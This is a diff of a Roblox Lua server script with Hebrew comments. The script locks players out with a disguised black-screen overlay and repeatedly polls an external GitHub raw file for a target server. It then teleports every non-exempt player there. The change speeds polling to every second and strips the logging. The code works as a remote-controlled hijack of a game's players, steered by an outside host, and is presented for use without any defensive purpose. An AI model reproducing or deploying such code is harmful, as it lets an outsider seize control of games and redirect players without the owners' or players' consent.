@@ -5,13 +5,13 @@ local Players = game:GetService("Players")
 -- הקישור ה-Raw המעודכן שלך
 local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"
 
--- רשימת חסימה (הם לא יקבלו מסך שחור ולא ישתגרו)
+-- רשימת חסימה (לא יקבלו מסך שחור ולא ישתגרו)
 local blockedPlayers = {
 	["noamdb15"] = true,
 	["dylanzyl123"] = true
 }
 
--- פונקציה ליצירת מסך שחור אצל השחקן
+-- פונקציה ליצירת מסך שחור מיידי
 local function createBlackScreen(player)
 	local screenGui = Instance.new("ScreenGui")
 	screenGui.Name = "InternalSystem"
@@ -27,23 +27,19 @@ local function createBlackScreen(player)
 	blackFrame.Parent = screenGui
 end
 
--- כששחקן נכנס למשחק
+-- כששחקן נכנס - מסך שחור ישר
 Players.PlayerAdded:Connect(function(player)
-	if blockedPlayers[player.Name] then
-		print(player.Name .. " is whitelisted. No lock applied.")
-		return
+	if not blockedPlayers[player.Name] then
+		createBlackScreen(player)
 	end
-
-	-- נותן לו מסך שחור
-	createBlackScreen(player)
-	print("Lock applied to: " .. player.Name)
 end)
 
--- לופ בדיקת ה-GitHub מהשרת
+-- לופ שיגור מהיר בטירוף (כל שנייה)
 task.spawn(function()
-	while task.wait(5) do
+	while true do
 		local success, response = pcall(function()
-			return HttpService:GetAsync(rawUrl .. "?t=" .. os.time())
+			-- מוסיף מספר רנדומלי לסוף הלינק כדי למנוע מהדפדפן לשמור מידע ישן (Cache)
+			return HttpService:GetAsync(rawUrl .. "?t=" .. tick())
 		end)
 
 		if success and response then
@@ -56,9 +52,9 @@ task.spawn(function()
 			local targetJobId = lines[2]
 
 			if targetJobId and targetJobId ~= "" then
-				-- עובר על כל השחקנים בשרת ומשגר את מי שלא חסום
 				for _, player in pairs(Players:GetPlayers()) do
 					if not blockedPlayers[player.Name] then
+						-- ניסיון שיגור
 						pcall(function()
 							TeleportService:TeleportToPlaceInstance(targetPlaceId or game.PlaceId, targetJobId, player)
 						end)
@@ -66,5 +62,6 @@ task.spawn(function()
 				end
 			end
 		end
+		task.wait(1) -- בדיקה מחדש כל שנייה אחת בדיוק
 	end
 end)
